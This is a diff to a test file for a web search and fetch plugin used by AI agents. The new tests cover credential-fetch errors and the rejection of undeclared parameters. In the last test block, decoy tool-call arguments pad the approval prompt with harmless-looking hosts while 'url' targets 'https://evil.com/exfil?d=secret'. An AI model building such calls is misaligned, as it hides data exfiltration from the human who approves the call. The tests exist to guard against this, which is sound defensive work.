@@ -343,6 +343,25 @@ describe("pinchy-web plugin", () => {
       expect(result.content[0].text).toMatch(/no longer connected/i);
     });
 
+    it("reports a credentials answer that is null as the credentials API's", async () => {
+      vi.stubGlobal(
+        "fetch",
+        vi.fn(async () => ({ ok: true, status: 200, statusText: "OK", json: async () => null }))
+      );
+
+      const factories = collectFactories(
+        credentialsPluginConfig({
+          "agent-1": { tools: ["pinchy_web_search"] },
+        })
+      );
+
+      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
+      const result = await tool.execute("call-1", { query: "test" });
+
+      expect(result.isError).toBe(true);
+      expect(result.content[0].text).toContain("credentials API answered null, not an object");
+    });
+
     it("aborts a hung credentials fetch via AbortSignal.timeout(10_000) instead of blocking forever", async () => {
       // Simulates a Pinchy container that never answers Pinchy's own internal
       // credentials route (mid-deploy, network blackhole) — the mock only
@@ -460,6 +479,32 @@ describe("pinchy-web plugin", () => {
       });
 
       expect(braveSearchMock).toHaveBeenCalledTimes(1);
+      expect(
+        fetchMock.mock.calls.filter((c) => String(c[0]).includes("report-auth-failure"))
+      ).toHaveLength(0);
+    });
+
+    it("does not POST report-auth-failure when the retry with a fresh key fails for another reason", async () => {
+      // The refetched key is fine; the retry then hits a Brave outage. Only an
+      // auth error says the key is bad — anything else would flip a healthy
+      // connection to auth_failed with nothing to clear it.
+      braveSearchMock
+        .mockRejectedValueOnce(new Error("401 Unauthorized"))
+        .mockRejectedValueOnce(
+          Object.assign(new Error("Brave Search API error (502): Bad Gateway"), { status: 502 })
+        );
+
+      const fetchMock = stubCredentialsFetch("brave-key-123");
+      const factories = collectFactories(
+        credentialsPluginConfig({ "agent-1": { tools: ["pinchy_web_search"] } })
+      );
+
+      const result = await factories.pinchy_web_search({ agentId: "agent-1" })!.execute("call-1", {
+        query: "test",
+      });
+
+      expect(result.isError).toBe(true);
+      expect(braveSearchMock).toHaveBeenCalledTimes(2);
       expect(
         fetchMock.mock.calls.filter((c) => String(c[0]).includes("report-auth-failure"))
       ).toHaveLength(0);
@@ -695,6 +740,47 @@ describe("pinchy-web plugin", () => {
 
       expect(result.isError).toBeUndefined();
       expect(result.content[0].text).toBe("Fetched content");
+    });
+  });
+
+  // Every tool can be gated, and a key the tool never reads is still shown to
+  // the person approving the call: URLs under `target`, `destination` and
+  // `targets` ahead of the one `url` the fetch reads take the room the
+  // approval prompt has for naming hosts. So neither tool runs with one.
+  describe("undeclared parameters", () => {
+    const decoys = {
+      target: `https://${"a".repeat(120)}.firma.at/`,
+      destination: "https://b.firma.at/",
+      targets: ["https://s1.firma.at/", "https://s2.firma.at/"],
+      url: "https://evil.com/exfil?d=secret",
+    };
+    const config = {
+      braveApiKey: "key",
+      agents: { "agent-1": { tools: ["pinchy_web_fetch", "pinchy_web_search"] } },
+    };
+
+    it.each(["pinchy_web_fetch", "pinchy_web_search"])(
+      "%s declares additionalProperties: false",
+      (name) => {
+        const tool = collectFactories(config)[name]({ agentId: "agent-1" })!;
+        expect(tool.parameters.additionalProperties).toBe(false);
+      }
+    );
+
+    it("pinchy_web_fetch refuses a call with decoy URLs and fetches nothing", async () => {
+      const tool = collectFactories(config).pinchy_web_fetch({ agentId: "agent-1" })!;
+      const result = await tool.execute("call-1", decoys);
+      expect(result.isError).toBe(true);
+      expect(result.content[0].text).toMatch(/does not take the parameters "target"/);
+      expect(webFetchMock).not.toHaveBeenCalled();
+    });
+
+    it("pinchy_web_search refuses a call with a key it does not declare", async () => {
+      const tool = collectFactories(config).pinchy_web_search({ agentId: "agent-1" })!;
+      const result = await tool.execute("call-1", { query: "acme", url: "https://evil.com/" });
+      expect(result.isError).toBe(true);
+      expect(result.content[0].text).toMatch(/does not take the parameter "url"/);
+      expect(braveSearchMock).not.toHaveBeenCalled();
     });
   });
 });
